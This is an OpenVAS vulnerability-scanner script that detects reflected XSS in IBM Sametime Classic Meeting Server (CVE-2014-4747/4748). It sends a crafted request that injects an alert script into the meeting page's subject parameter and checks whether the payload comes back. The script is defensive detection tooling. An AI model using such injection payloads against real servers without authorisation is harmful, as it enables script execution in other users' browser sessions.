###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ibm_sametime_meet_server_mult_vuln.nasl 3522 2016-06-15 12:39:54Z benallard $
#
# IBM Sametime Classic Meeting Server Multiple Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804825");
  script_version("$Revision: 3522 $");
  script_cve_id("CVE-2014-4747", "CVE-2014-4748");
  script_bugtraq_id(68823, 68841);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2016-06-15 14:39:54 +0200 (Wed, 15 Jun 2016) $");
  script_tag(name:"creation_date", value:"2014-08-27 17:35:20 +0530 (Wed, 27 Aug 2014)");
  script_name("IBM Sametime Classic Meeting Server Multiple Vulnerabilities");

  tag_summary =
"This host is installed with IBM Sametime Classic Meeting Server and is prone
to multiple vulnerabilities.";

  tag_vuldetect =
"Send a crafted HTTP GET request and check whether it is able to read string
or not.";

  tag_insight =
"Multiple flaws are due to,
- improper validation of user supplied input.
- presence of password hash in HTML source.";

  tag_impact =
"Successful exploitation will allow local attacker to gain access to the meeting
password hash from the HTML source and allow remote attackers to execute
arbitrary script code in a user's browser session within the trust
relationship between their browser and the server.

Impact Level: Application";

  tag_affected =
"IBM Sametime Classic Meeting Server 8.x through 8.5.2.1";

  tag_solution =
"Upgrade or apply patches as given in below link,
http://www-01.ibm.com/support/docview.wss?uid=swg21679454";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);

  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/127830");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/127831");
  script_xref(name : "URL" , value : "http://www-01.ibm.com/support/docview.wss?uid=swg21679221");
  script_xref(name : "URL" , value : "http://www-01.ibm.com/support/docview.wss?uid=swg21679454");
  script_summary("Check if IBM Sametime Classic Meeting Server is vulnerable to xss");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
http_port = "";
sndReq = "";
rcvRes = "";
url = "/stcenter.nsf";

## Get HTTP Port
http_port = get_http_port(default:80);
if(!http_port){
  http_port = 80;
}

## Check the port status
if(!get_port_state(http_port)){
  exit(0);
}

## Construct GET Request
sndReq = http_get(item: url,  port:http_port);
rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

##Confirm Application
if (rcvRes && ">Welcome to IBM Lotus Sametime<" >< rcvRes)
{
  ## Construct Attack
  url = "/stconf.nsf/WebAttendFrameset?OpenAgent&view=Attend&docID=$DOCID$&" +
        "meetingID=$MEETID$&join_type=mrc&subject=%3C/title%3E%3Cscript%3Ea" +
        "lert(%27OpenVas-XSS-Test%27)%3C/script%3E%3C";

  ## Confirm the Exploit
  if(http_vuln_check(port:http_port, url:url,
     pattern:"%3C/title%3E%3Cscript%3Ealert\(%27OpenVas-XSS-Test%27\)%3C/script%3E%3C",
     extra_check:"IBM Lotus Sametime"))
  {
    report = report_vuln_url( port:http_port, url:url );
    security_message(port:http_port, data:report);
    exit(0);
  }
}
